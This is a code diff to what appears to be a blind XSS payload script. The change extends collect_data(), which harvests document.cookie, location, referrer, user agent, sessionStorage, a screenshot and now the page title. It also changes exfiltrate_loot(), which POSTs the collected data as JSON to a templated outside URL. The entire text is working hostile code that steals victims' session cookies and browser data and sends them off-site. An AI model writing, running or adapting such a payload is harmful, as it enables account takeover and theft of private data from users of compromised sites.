@@ -22,7 +22,8 @@ function screenshot() {
 
 function collect_data() {
   return new Promise(function (resolve, reject) {
-    collected_data["Cookies"]
+    collected_data["Title"]
+      = collected_data["Cookies"]
       = collected_data["Location"]
       = collected_data["Referrer"]
       = collected_data["User-Agent"]
@@ -33,7 +34,8 @@ function collect_data() {
       = collected_data["sessionStorage"]
       = collected_data["Screenshot"]
       = "";
-
+    
+    try { collected_data["Title"] = return_value(document.title.toString()) } catch (e) { }
     try { collected_data["Location"] = return_value(location.toString()) } catch (e) { }
     try { collected_data["Cookies"] = return_value(document.cookie) } catch (e) { }
     try { collected_data["Referrer"] = return_value(document.referrer) } catch (e) { }
@@ -62,7 +64,9 @@ function exfiltrate_loot() {
   var xhr = new XMLHttpRequest()
   xhr.open("POST", "{{ exf_url }}", true)
   xhr.setRequestHeader("Content-Type", "application/json")
-  xhr.send(JSON.stringify(collected_data))
+  xhr.send(JSON.stringify({
+    data: collected_data
+  }));
 }
 
 // Load the html2canvas dependency
